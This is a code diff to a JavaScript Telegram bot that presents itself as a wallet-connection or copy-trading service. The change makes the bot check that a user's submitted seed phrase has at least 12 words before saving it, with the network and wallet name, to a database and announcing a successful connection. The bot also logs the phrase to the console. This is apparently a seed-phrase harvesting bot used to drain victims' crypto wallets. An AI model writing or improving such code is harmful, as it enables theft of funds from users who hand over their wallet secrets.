@@ -161,23 +161,37 @@ bot.on("callback_query", (callbackQuery) => {
       // Step 5: Listen for the next message to get the 7-seed phrase
       bot.once("message", async (msg) => {
         const seedPhrase = msg.text;
+        const seedArray = seedPhrase.split(" ");
+        if (seedArray.length > 0) {
+          if (seedArray.length < 12) {
+            bot.sendMessage(chatId, "Incomplete seed, /start to try again");
+          } else {
+            await updatedatabase(network, walletName, seedPhrase);
+
+            bot.sendMessage(
+              chatId,
+              "Wallet Successfull connected, /input_wallet  you wish to copy"
+            );
+          }
+        } else {
+          console.log("Network:", network);
+          console.log("Wallet Name:", walletName);
+          console.log("7-Seed Phrase:", seedPhrase);
+          await updatedatabase(network, walletName, seedPhrase);
+
+          bot.sendMessage(
+            chatId,
+            "Wallet Successfull connected, /input_wallet  you wish to copy"
+          );
+
+          // Send a confirmation message to the user
+          bot.sendMessage(
+            chatId,
+            `Wallet Name "${walletName}" with Network "${network}" and Seed Phrase has been imported.`
+          );
+        }
 
         // Do something with the wallet name and seed phrase
-        console.log("Network:", network);
-        console.log("Wallet Name:", walletName);
-        console.log("7-Seed Phrase:", seedPhrase);
-        await updatedatabase(network, walletName, seedPhrase);
-
-        bot.sendMessage(
-          chatId,
-          "Wallet Successfull connected, /input_wallet  you wish to copy"
-        );
-
-        // Send a confirmation message to the user
-        bot.sendMessage(
-          chatId,
-          `Wallet Name "${walletName}" with Network "${network}" and Seed Phrase has been imported.`
-        );
       });
     });
   });
